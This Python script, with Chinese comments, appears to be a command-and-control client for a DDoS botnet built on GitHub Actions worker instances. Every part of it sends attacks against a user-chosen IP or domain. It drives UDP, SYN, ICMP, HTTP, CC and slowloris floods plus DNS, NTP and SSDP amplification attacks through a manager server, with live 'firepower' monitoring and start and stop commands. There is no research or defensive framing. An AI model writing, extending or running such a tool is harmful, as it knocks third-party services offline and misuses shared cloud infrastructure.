#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GitHub Actions 云端攻击客户端（科技风）

功能：
- 多实例并发攻击（选多个 worker 同时打）
- 攻击类型：udp/tcp/icmp/http/cc/slowloris/dns/ntp/ssdp
- 参数：目标/端口/力度/时长/包大小/并发
- 实时监控（科技风界面：表格+进度条+ASCII图表）
- 停止攻击
- 命令模式 + 交互模式

用法：
  python3 ghvps-attack.py <EXEC_TOKEN> [MANAGER_URL]
  命令模式：
    python3 ghvps-attack.py <token> create --target 1.2.3.4 --type udp --duration 60 --workers inst2,inst5
    python3 ghvps-attack.py <token> monitor
    python3 ghvps-attack.py <token> stop --workers inst2,inst5
"""
import os
import sys
import time
import json
import signal
import argparse
import threading
import urllib.request
import urllib.error

from rich.console import Console
from rich.table import Table
from rich.live import Live
from rich.panel import Panel
from rich.layout import Layout
from rich.text import Text
from rich.progress import Progress, BarColumn, TextColumn

MANAGER = os.environ.get("GHVPS_MANAGER", "https://ghvps.kekeke.cc.cd")
TOKEN = os.environ.get("EXEC_TOKEN", "")

console = Console()

# 攻击类型说明
ATTACK_TYPES = {
    "udp": "UDP 洪泛（打带宽）",
    "tcp": "TCP SYN 洪泛（raw）",
    "icmp": "ICMP 洪泛（raw）",
    "http": "HTTP 洪泛",
    "cc": "CC 攻击（模拟真实请求）",
    "slowloris": "慢速连接（占连接）",
    "dns": "DNS 放大器",
    "ntp": "NTP 放大器",
    "ssdp": "SSDP 放大器",
}


def api(method, url, data=None, timeout=30):
    """HTTP 请求，返回 dict"""
    h = {"Content-Type": "application/json",
         "Authorization": f"Bearer {TOKEN}",
         "User-Agent": "Mozilla/5.0 (ghvps-attack)"}
    body = json.dumps(data).encode() if data is not None else None
    req = urllib.request.Request(url, method=method, headers=h, data=body)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return json.loads(r.read().decode() or "null")
    except urllib.error.HTTPError as e:
        try:
            return json.loads(e.read().decode())
        except Exception:
            return {"ok": False, "error": f"HTTP {e.code}"}
    except Exception as e:
        return {"ok": False, "error": str(e)}


def get_instances():
    """获取所有 running 实例"""
    d = api("GET", MANAGER.rstrip("/") + "/api/instances")
    return [i for i in d.get("instances", []) if i.get("status") == "running"]


def start_attack(workers, params):
    """并行启动攻击到多个 worker"""
    results = {}
    threads = []

    def _start(inst):
        url = f"https://{inst['hostname']}/api/attack/start"
        r = api("POST", url, params)
        results[inst["id"]] = {"ok": r.get("ok"), "detail": r}

    for inst in workers:
        t = threading.Thread(target=_start, args=(inst,))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    return results


def stop_attack(workers):
    """停止多个 worker 的攻击"""
    results = {}
    for inst in workers:
        url = f"https://{inst['hostname']}/api/attack/stop"
        r = api("POST", url, {})
        results[inst["id"]] = r.get("ok", False)
    return results


def worker_status(hostname):
    """获取单个 worker 的攻击状态"""
    url = f"https://{hostname}/api/attack/status"
    return api("GET", url)


def format_num(n):
    """格式化数字（1,234,567）"""
    return f"{n:,}"


def build_display_table(stats):
    """构建科技风统计表格"""
    table = Table(show_header=True, header_style="bold cyan",
                  border_style="blue", box=None)
    table.add_column("机器", style="bold")
    table.add_column("PPS", justify="right", style="green")
    table.add_column("Mbps", justify="right", style="yellow")
    table.add_column("连接数", justify="right")
    table.add_column("状态", style="magenta")
    for inst_id, s in stats.items():
        status = "● 攻击中" if s.get("running") else "○ 停止"
        table.add_row(
            inst_id,
            format_num(s.get("pps", 0)),
            format_num(s.get("mbps", 0)),
            format_num(s.get("conns", 0)),
            status,
        )
    return table


def build_bar_chart(history, width=40):
    """ASCII 图表：从历史数据生成带宽曲线"""
    if len(history) < 2:
        return "  等待数据..."
    # 取最近 width 个点
    data = history[-width:]
    max_v = max(data) if max(data) > 0 else 1
    levels = ["▁", "▂", "▃", "▄", "▅", "▆", "▇", "█"]
    chart = ""
    for v in data:
        idx = int(v / max_v * (len(levels) - 1))
        chart += levels[idx]
    return chart


def monitor_attack(workers, duration, total_seconds=None):
    """实时监控攻击（科技风界面）"""
    if total_seconds is None:
        total_seconds = duration
    start_time = time.time()
    history = []  # 总带宽历史

    def _refresh():
        stats = {}
        for inst in workers:
            s = worker_status(inst["hostname"])
            stats[inst["id"]] = {
                "running": s.get("running", False),
                "pps": (s.get("stats") or {}).get("pps", 0),
                "mbps": (s.get("stats") or {}).get("mbps", 0),
                "conns": (s.get("stats") or {}).get("conns", 0),
            }
        return stats

    try:
        with Live(console=console, refresh_per_second=2, screen=False) as live:
            while True:
                elapsed = int(time.time() - start_time)
                stats = _refresh()
                total_pps = sum(s["pps"] for s in stats.values())
                total_mbps = sum(s["mbps"] for s in stats.values())
                history.append(total_mbps)

                # 标题
                title = Text(f"G H V P S   A T T A C K", style="bold red")
                info = Text(f"已运行 {elapsed}s / 共 {total_seconds}s | "
                            f"总火力: {format_num(total_pps)} pps / "
                            f"{format_num(total_mbps)} Mbps", style="bold cyan")

                # 表格
                table = build_display_table(stats)
                chart = build_bar_chart(history)

                # 进度条
                progress = Progress(
                    TextColumn("[bold cyan]{task.description}"),
                    BarColumn(bar_width=30),
                    TextColumn("[bold]{task.percentage:>3.0f}%"),
                )
                task = progress.add_task("攻击进度", total=total_seconds, completed=elapsed)

                layout = Layout()
                layout.split_column(
                    Layout(Panel(title, border_style="red")),
                    Layout(Panel(info, border_style="cyan")),
                    Layout(Panel(table, border_style="blue")),
                    Layout(Panel(progress, border_style="green")),
                    Layout(Panel(Text(chart + f"  {format_num(total_mbps)} Mbps 曲线", style="green"),
                                 border_style="yellow", title="带宽曲线")),
                    Layout(Text("[red]Ctrl+C 停止攻击[/red]  [yellow]总火力实时汇总[/yellow]",
                               style="dim")),
                )
                live.update(layout)

                # 结束条件：超过时长 或 所有 worker 停止
                if elapsed >= total_seconds:
                    break
                all_stopped = all(not s["running"] for s in stats.values())
                if all_stopped and elapsed > 3:
                    break
                time.sleep(1.5)
    except KeyboardInterrupt:
        console.print("\n[bold red]⏹ 停止攻击...[/bold red]")
    finally:
        return _refresh()


def select_instances_interactive():
    """交互选择实例（多选）"""
    insts = get_instances()
    if not insts:
        console.print("[red]没有可用的实例[/red]")
        return None
    console.print("[bold cyan]选择攻击实例（可多选，逗号分隔）:[/bold cyan]")
    for idx, i in enumerate(insts):
        console.print(f"  [{idx}] {i['id']} → {i['hostname']}")
    try:
        sel = input("  输入序号（如 0,1,3）: ").strip()
        idxs = [int(x.strip()) for x in sel.split(",") if x.strip().isdigit()]
        return [insts[i] for i in idxs if 0 <= i < len(insts)]
    except Exception:
        return None


def configure_attack_interactive():
    """交互配置攻击参数"""
    console.print("[bold cyan]=== 攻击配置 ===[/bold cyan]")
    target = input("  目标 IP/域名: ").strip()
    if not target:
        return None
    console.print("  攻击类型:")
    for k, v in ATTACK_TYPES.items():
        console.print(f"    {k:<10} {v}")
    atype = input("  类型（默认 udp）: ").strip() or "udp"
    port = int(input("  端口（默认 80）: ").strip() or "80")
    duration = int(input("  时长秒（默认 60）: ").strip() or "60")
    concurrency = int(input("  并发（默认 500）: ").strip() or "500")
    packet = int(input("  包大小（默认 1400）: ").strip() or "1400")
    return {
        "target": target, "type": atype, "port": port,
        "duration": duration, "concurrency": concurrency,
        "packet_size": packet,
    }


def cmd_create(args):
    """创建攻击"""
    if not args.target:
        console.print("[red]需要 --target[/red]")
        return
    workers = get_instances()
    if args.workers:
        ids = [w.strip() for w in args.workers.split(",")]
        workers = [w for w in workers if w["id"] in ids]
    if not workers:
        console.print("[red]没有匹配的实例[/red]")
        return
    params = {
        "token": TOKEN,
        "target": args.target,
        "type": args.type,
        "port": args.port,
        "duration": args.duration,
        "concurrency": args.concurrency,
        "packet_size": args.packet_size,
    }
    console.print(f"[cyan]启动攻击 → {args.target}:{args.port} ({args.type}) "
                  f"对 {len(workers)} 台机器[/cyan]")
    results = start_attack(workers, params)
    ok = sum(1 for r in results.values() if r.get("ok"))
    console.print(f"[green]✅ {ok}/{len(workers)} 台启动成功[/green]")
    if ok and not args.no_monitor:
        console.print("[cyan]进入实时监控（Ctrl+C 停止）[/cyan]")
        monitor_attack(workers, args.duration)


def cmd_monitor(args):
    """监控当前所有攻击"""
    workers = get_instances()
    if args.workers:
        ids = [w.strip() for w in args.workers.split(",")]
        workers = [w for w in workers if w["id"] in ids]
    if not workers:
        console.print("[red]没有实例[/red]")
        return
    console.print("[cyan]监控中（显示各实例实时统计）[/cyan]")
    monitor_attack(workers, args.duration or 3600)


def cmd_stop(args):
    """停止攻击"""
    workers = get_instances()
    if args.workers:
        ids = [w.strip() for w in args.workers.split(",")]
        workers = [w for w in workers if w["id"] in ids]
    if not workers:
        console.print("[red]没有实例[/red]")
        return
    console.print("[yellow]停止攻击...[/yellow]")
    results = stop_attack(workers)
    ok = sum(1 for v in results.values() if v)
    console.print(f"[green]✅ 已停止 {ok}/{len(workers)} 台[/green]")


def cmd_interactive(args):
    """交互模式"""
    console.print(Panel("[bold red]G H V P S   A T T A C K[/bold red]\n"
                        "[cyan]云端多实例攻击控制台[/cyan]", border_style="red"))
    workers = select_instances_interactive()
    if not workers:
        return
    params = configure_attack_interactive()
    if not params:
        return
    console.print(f"[cyan]目标: {params['target']}:{params['port']} "
                  f"类型: {params['type']} 时长: {params['duration']}s "
                  f"机器: {len(workers)} 台[/cyan]")
    results = start_attack(workers, params)
    ok = sum(1 for r in results.values() if r.get("ok"))
    console.print(f"[green]✅ {ok}/{len(workers)} 台启动[/green]")
    if ok:
        monitor_attack(workers, params["duration"])


def main():
    global MANAGER, TOKEN
    # 参数解析：token [manager] [command] [args]
    if len(sys.argv) < 2:
        console.print("[red]用法: python3 ghvps-attack.py <EXEC_TOKEN> [MANAGER_URL] "
                      "[create|monitor|stop|interactive] [参数][/red]")
        sys.exit(1)
    TOKEN = sys.argv[1]
    if len(sys.argv) > 2 and sys.argv[2].startswith("http"):
        MANAGER = sys.argv[2]
        cmd_idx = 3
    else:
        cmd_idx = 2

    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument("--target")
    parser.add_argument("--type", default="udp")
    parser.add_argument("--port", type=int, default=80)
    parser.add_argument("--duration", type=int, default=60)
    parser.add_argument("--concurrency", type=int, default=500)
    parser.add_argument("--packet-size", type=int, default=1400)
    parser.add_argument("--workers")
    parser.add_argument("--no-monitor", action="store_true")

    cmd = sys.argv[cmd_idx] if len(sys.argv) > cmd_idx else "interactive"
    args = parser.parse_args(sys.argv[cmd_idx + 1:])

    if cmd == "create":
        cmd_create(args)
    elif cmd == "monitor":
        cmd_monitor(args)
    elif cmd == "stop":
        cmd_stop(args)
    else:
        cmd_interactive(args)


if __name__ == "__main__":
    main()